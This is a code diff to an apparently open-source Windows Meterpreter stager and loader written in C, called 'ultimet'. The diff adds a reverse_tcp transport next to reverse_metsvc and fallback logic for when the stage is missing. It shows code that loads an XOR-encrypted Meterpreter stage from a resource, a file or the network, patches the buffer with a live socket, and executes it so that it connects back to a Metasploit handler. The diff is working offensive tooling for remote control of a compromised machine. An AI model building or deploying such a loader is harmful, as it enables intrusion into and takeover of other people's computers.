@@ -48,17 +48,18 @@ int wmain(int argc, wchar_t *argv[])
 	DWORD index = 0;							// will be used to locate offset of stuff to be patched "transport, the url ... etc."
 	char EncKey[17] = {0};						// XOR Encryption key
 	void (*function)() = nullptr;				// The casted-to-be-function after we have everything in place.
-	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager where stage is received over network. 
+	bool FallbackToStager = false;				// If the stage is not bundled in the exe as a resource, or "-f" is not specified, ultimet falls back to work as a stager: if this is true, metsvc will not be availabe. 
+	bool metsvc = false;						// Is metsvc chosen as the transport? this will only work if we have the stage upfront, otherwise it will fail.
 	int err = 0;								// Errors
 
-	//If "-s" is specified (load stage from local file)
+	//If "-f" is specified (load stage from local file)
 	wchar_t StageFilePath[MAX_PATH] = {0};		// If the stage is going to be loaded from a dll file from the filesystem, path will be put here. 
 
 	// reverse_metsvc specific Variables
-	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_metsvc
+	SOCKET ConnectSocket = INVALID_SOCKET;		// Socket ... will be used for reverse_metsvc and reverse_tcp
 
 	// HTTP(S) Specific Variables
-	char url[512] = {0};	//Full URL 
+	char url[512] = {0};	//Full URL, 512 bytes are enough. 
 	/*************
 	Program Start
 	*************/
@@ -70,9 +71,14 @@ int wmain(int argc, wchar_t *argv[])
 			if (wcscmp(argv[i], L"-t") == 0) { //Transport; available options are reverse_metsvc, REVERSE_HTTP, REVERSE_HTTPS ... case doesn't matter.
 				payload_settings.TRANSPORT = argv[i + 1];
 				_wcsupr(payload_settings.TRANSPORT); // Wide-String-to-uppercase
-				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0) 
+				if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_TCP") == 0) 
 				{
 					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+				}
+				else if(wcscmp(payload_settings.TRANSPORT,L"REVERSE_METSVC") == 0)
+				{
+					payload_settings.TRANSPORT = L"METERPRETER_TRANSPORT_SSL";
+					metsvc = true;
 				}
 				else if (wcscmp(payload_settings.TRANSPORT,L"REVERSE_HTTP") == 0)
 				{
@@ -126,13 +132,24 @@ int wmain(int argc, wchar_t *argv[])
 		bufferSize = ResourceToBuffer(101, (LPCTSTR)L"BINARY", &buffer); //copy encrypted stage from resource to buffer
 		if (bufferSize == 0) // if something went wrong...
 		{
-			dprintf(L"[!] Couldn't read stage from resource & \"-f\" not speified; falling back to \"stager\" mode...\n"
-				L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
-				L" -  You can also load the stage from file system by using \"-f\" switch.\n");
 			FallbackToStager = true; // We will function in "stager" mode.
+			if(metsvc) // Ok, we will fallback to stager mode, however, metsvc will not be available in stager mode ... right?
+			{
+				dprintf(L"\n[-] Unable to load stage from resource, and \"-f\" not specified ... yet you've chosen reverse_metsvc!\n");
+				dprintf(L"    sorry sweetheart, that's not going to work, metsvc *requires* that the stage is available upfront.\n");
+				dprintf(L"[-] Use inmet.exe, use \"reverse_tcp\", use another transport, or bundle this exe with metsvc.dll.\n"
+					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
+					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
+				dprintf(L"[-] ... will exit.\n");
+				exit(1);
+			} else
+			{
+				dprintf(L"[!] Couldn't read stage from resource & \"-f\" not speified; falling back to \"stager\" mode...\n"
+					L" -  To bundle the stage into this exe: import metsrv.dll as a resource, call it \"BINARY\" and ID it \"101\".\n"
+					L" -  You can also load the stage from file system by using \"-f\" switch.\n");
+			}
 		}
 	}
-
 	/*///////////////////////////
 	/////////////////////////////
 	Warning! Program split ahead!
@@ -291,6 +308,24 @@ int wmain(int argc, wchar_t *argv[])
 		// Are we reverse_metsvc?
 		if(wcscmp(payload_settings.TRANSPORT,L"METERPRETER_TRANSPORT_SSL") == 0)
 		{
+			if(!metsvc) //Are we METERPRETER_TRANSPORT_SSL but not metsvc? note that reverse_tcp AND reverse_metsvc use the same transport, it's the exploit/multi/handler that will make the difference.
+			{
+				// If we reached this far, it means that the stage is loaded, transport is SSL, yet metsvc is still false "not chosen", even though we have the stage
+				// That means stage will be loaded AGAIN over network, next time, they should chose reverse_metsvc.
+				// However, The customer is always right, right? let's connect them to their beloved reverse_tcp in stager mode nevertheless.
+				// ... but we have to tell them what they've done wrong.
+				dprintf(L"\n[!] We already have the stage, why did you chose reverse_tcp? you could've picked reverse_metsvc.\n" 
+					L"    next time use \"-t reverse_metsvc\" -> \"exploit/multi/handler/windows/metsvc_reverse_tcp\".\n"
+					L" -  anyway, will assume you know what you're doing and connect to reverse_tcp in *stager* mode...\n\n");
+					
+				dprintf(L"[*] \nMake sure you have \"windows/meterpreter/reverse_tcp\" handler running.\n\n");
+				
+				// Let's just fallback to stager mode ... you foolish noisy bandwidth wasters.
+				StagerRevereTCP(payload_settings.LHOST,payload_settings.LPORT);
+				// see you on the other side :)
+			} 
+			// we are METERPRETER_TRANSPORT_SSL, we have the stage, and metsvc is true :)
+
 			// Adjusting buffer .. this is important!
 			// reverse_metsvc has extra requirements ... the stage needs to be preceeded with `0xBF + 4 bytes of a valid socket connected to the handler` 
 			// My approach to acheive this: We'll first VirtualAlloc size + 5 bytes to another buffer "TempBuffer", skip 5 bytes, then copy the contents 
@@ -300,11 +335,12 @@ int wmain(int argc, wchar_t *argv[])
 			buffer = TempBuffer;							//Got it? I'm sure there's a better way to do that, but I'm not smart enough to figure out how yet :).
 			//////////////////////////////////////////////////
 
+			dprintf(L"\n[*] Make sure you have \"windows/metsvc_reverse_tcp\" handler running.\n\n");
 			ConnectSocket = get_socket(payload_settings.LHOST,payload_settings.LPORT);
 			if (ConnectSocket == INVALID_SOCKET)
 			{
 				dprintf(L"[-] Failed to connect ... will exit!\n");
-				exit(0);
+				exit(1);
 			}
 			dprintf(L"[*] Setting EDI-to-be value:  0x%08x -> 0xBF\n", &buffer);
 			buffer[0] = 0xBF;
